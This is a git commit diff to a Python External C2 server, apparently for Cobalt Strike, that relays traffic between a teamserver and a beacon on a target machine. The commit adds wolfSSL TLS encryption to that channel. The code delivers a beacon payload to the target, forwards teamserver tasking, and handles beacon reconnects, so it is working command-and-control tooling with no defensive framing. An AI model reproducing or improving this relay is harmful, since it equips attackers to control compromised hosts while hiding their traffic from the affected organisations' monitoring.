077d3ea66d72e403f6a656163a5f46ed34e17a97
fitzgeralddaniel <fitzgerald.daniel.p@gmail.com>
2021-11-24 10:43:01 -0500

    First attempt at adding TLS with wolfSSL

--- TCP/server.py
+++ TCP/server.py
@@ -11,13 +11,14 @@ import socket
 import struct
 import sys
 import time
+import wolfssl
 
 
 class TCPinfo:
     """
     @brief Class to hold info for TCP session
     """
-    def __init__(self, ts_ip, ts_port, srv_ip, srv_port, pipe_str):
+    def __init__(self, ts_ip, ts_port, srv_ip, srv_port, pipe_str, cert, key):
         """
 
         :param ts_ip: IP address of CS Teamserver
@@ -25,6 +26,8 @@ class TCPinfo:
         :param srv_ip: IP to bind to on server
         :param srv_port: Port of server to listen on
         :param pipe_str: String for named pipe on client
+        :param cert: Path to server pem cert
+        :param key: Path to server pem key
         """
         if len(pipe_str) > 50:
             raise ValueError('pipe_str must be less than 50 characters')
@@ -33,6 +36,8 @@ class TCPinfo:
         self.srv_ip = srv_ip
         self.srv_port = srv_port
         self.pipe_str = pipe_str
+        self.cert = cert
+        self.key = key
         
 
 class ExternalC2Controller:
@@ -56,42 +61,6 @@ class ExternalC2Controller:
         len = struct.unpack("<I", data[0:3])
         body = data[4:]
         return len[0], body
-    
-    def base64(self, msg):
-        """
-
-        :param msg: String to encode in Base64
-        :return: Base64 encoded string (in bytes)
-        """
-        b64msg = base64.b64encode(msg)
-        return b64msg
-
-    def debase64(self, b64msg):
-        """
-
-        :param b64msg: Base64 string to be decoded
-        :return: Decoded string
-        """
-        msg = base64.b64decode(b64msg)
-        return msg
-    
-    def equalcheck(self, b64msg):
-        """
-
-        :param b64msg: Base64 string
-        :return: Base64 string with == at end of it
-        """
-        # TODO: Find a better way of checking for end of B64 message
-        equalbytes = "=".encode()
-        equalequalbytes = "==".encode()
-        if b64msg.find(equalequalbytes) != -1:
-            return b64msg
-        elif b64msg.find(equalbytes) != -1:
-            b64msg += equalbytes
-            return b64msg
-        else:
-            b64msg += equalequalbytes
-            return b64msg
 
     def send_to_ts(self, data):
         """
@@ -115,29 +84,29 @@ class ExternalC2Controller:
             data += self._socketTS.recv(frame_length - len(data))
         return data
 
-    def sendToBeacon(self, tcpinfo, data):
+    def sendToBeacon(self, secure_sock, data):
         """
         
-        :param tcpinfo: Class with user tcp info
+        :param secure_sock: TLS Socket
         :param data: Data to send to beacon
         """
         frame = self.encode_frame(data)
         try:
-            self._socketBeacon.sendall(frame)
+            secure_sock.sendall(frame)
         except Exception as e:
             print("sendall() in sendToBeacon failed. Error: {}".format(e))
             return -1
         return None
 
 
-    def recvFromBeacon(self, tcpinfo):
+    def recvFromBeacon(self, secure_sock):
         """
 
-        :param tcpinfo: Class with user TCP info
+        :param secure_sock: TLS Socket
         :return: data received from beacon
         """
         try:
-            data_length = self._socketBeacon.recv(4)
+            data_length = secure_sock.recv(4)
         except:
             print("Recv failed.")
             return -1
@@ -151,7 +120,7 @@ class ExternalC2Controller:
         data = b''
         while (total < length):
             try:
-                temp = self._socketBeacon.recv(length-total)
+                temp = secure_sock.recv(length-total)
             except Exception as e:
                 print("Recv data in recvFromBeacon failed. Error: {}".format(e))
                 return -1
@@ -188,20 +157,26 @@ class ExternalC2Controller:
         self._socketServer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self._socketServer.bind((tcpinfo.srv_ip,tcpinfo.srv_port))
         self._socketServer.listen()
+
+        context = wolfssl.SSLContext(wolfssl.PROTOCOL_TLSv1_2, server_side=True)
+        context.load_cert_chain(tcpinfo.cert, tcpinfo.key)
+        secure_sock = None
+
         self._socketBeacon, beacon_addr = self._socketServer.accept()
         print("Connected to : {}".format(beacon_addr))
-
+        secure_sock = context.wrap_socket(self._socketBeacon)
         # Send beacon payload to target
-        self.sendToBeacon(tcpinfo, data)
+        self.sendToBeacon(secure_sock, data)
         current_beacon_ip = beacon_addr[0]
 
         while True:
 
-            data = self.recvFromBeacon(tcpinfo)
+            data = self.recvFromBeacon(secure_sock)
             if data == None:
                 print("Disconnected from beacon, likely due to sleep.")
                 self._socketBeacon, beacon_addr = self._socketServer.accept()
                 print("Connected to : {}".format(beacon_addr))
+                secure_sock = context.wrap_socket(self._socketBeacon)
                 if current_beacon_ip == beacon_addr[0]:
                     continue
                 else:
@@ -215,8 +190,9 @@ class ExternalC2Controller:
 
             data = self.recv_from_ts()
             print("Received {} bytes from TS and sending to beacon".format(len(data)))
-            if (self.sendToBeacon(tcpinfo, data) == -1):
+            if (self.sendToBeacon(secure_sock, data) == -1):
                 break
+        secure_sock.close()
         self._socketBeacon.close()
         self._socketServer.close()
         self._socketTS.close()
@@ -230,12 +206,14 @@ parser.add_argument('ts_ip', help="IP of teamserver (or redirector).")
 parser.add_argument('srv_ip', help="IP to bind to on server.")
 parser.add_argument('srv_port', type=int, help="Port number to bind to on server.")
 parser.add_argument('pipe_str', help="String to name the pipe to the beacon. It must be the same as the client.")
+parser.add_argument('cert', help="Path to servers cert. (PEM format)")
+parser.add_argument('key', help="Path to servers key. (PEM format)")
 parser.add_argument('--teamserver_port', '-tp', default=2222, type=int, help="Customize the port used to connect to the teamserver. Default is 2222.")
 parser.add_argument('--restart', '-r', default="N", help="Sleep 10s then restart the server after a disconnect or exit (Y/N). Default is N.")
 parser.add_argument('--arch', '-a', choices=['x86', 'x64'], default='x86', type=str, help="Architecture to use for beacon. x86 or x64. Default is x86.")
 args = parser.parse_args()
 controller = ExternalC2Controller(args.teamserver_port)
-tcpinfo = TCPinfo(args.ts_ip, args.teamserver_port, args.srv_ip, args.srv_port, args.pipe_str)
+tcpinfo = TCPinfo(args.ts_ip, args.teamserver_port, args.srv_ip, args.srv_port, args.pipe_str, args.cert, args.key)
 while True:
     if(args.arch == 'x64'):
         print('Ensure client is x64!')
